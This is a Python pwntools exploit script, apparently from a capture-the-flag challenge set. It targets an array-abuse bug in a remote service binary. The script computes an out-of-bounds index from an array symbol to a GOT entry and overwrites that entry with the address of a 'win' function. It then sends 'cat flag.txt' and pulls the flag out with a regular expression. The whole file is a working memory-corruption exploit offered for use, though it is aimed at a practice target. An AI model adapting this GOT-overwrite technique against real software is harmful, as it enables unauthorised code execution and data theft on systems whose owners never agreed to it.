from pwn import *
import detection
import re

# context.log_level = 'ERROR'
# logging.disable(logging.CRITICAL)
context.clear(arch='amd64')


# 9-arrayabuse-exploit-module

def exploit(binary: str):
    e = ELF(binary)
    got_entries = e.got
    # Getting rid of entries that won't work for sure:
    got_entries.pop('__libc_start_main')
    got_entries.pop('__gmon_start__')
    got_entries.pop('stdout')
    got_entries.pop('stdin')
    got_entries.pop('stderr')
    items = e.sym['items']
    target_entry = got_entries[next(iter(got_entries))]

    # print(hex(target_entry))
    # So, the length varies widely. I'll use 8 as a worst case scenario I guess.
    index = (target_entry - items) // 0x8 - 1
    # print(next(iter(e.got)))
    flag_regex = r'flag\{[^}]+\}'
    for i in range(index, 0, 1):
        url = f'ace-service-{binary}.chals.io'
        p = remote(url, 443, ssl=True, sni=url)
        # p = process(binary)
        # pid = gdb.attach(p, 'b *vuln+169\ncontinue')

        print(i)
        '''
        items = e.sym['items']
        target_entry = e.got['getgid']
        index = (target_entry - items) // 0x18
        '''
        p.recvuntil(b'>>>', timeout=0.2)
        # I think I need to do calculations to make sure I'm not overwriting the system call.

        p.sendline(str(i))
        p.recvuntil(b'>>>', timeout=0.2)
        # Maximizes odds of getting a winner
        # So, the overwrite of what comes before makes it fail
        p.sendline(p64(e.sym['win']) * 4)

        # Since I'm going for a shell rather than a win function, there's no try and see here.
        # p.interactive()

        p.sendline(b'cat flag.txt')
        output = p.recvall(timeout=0.2)

        flag = re.findall(flag_regex, output.decode())

        if flag:  # Success

            return flag[0]

    return
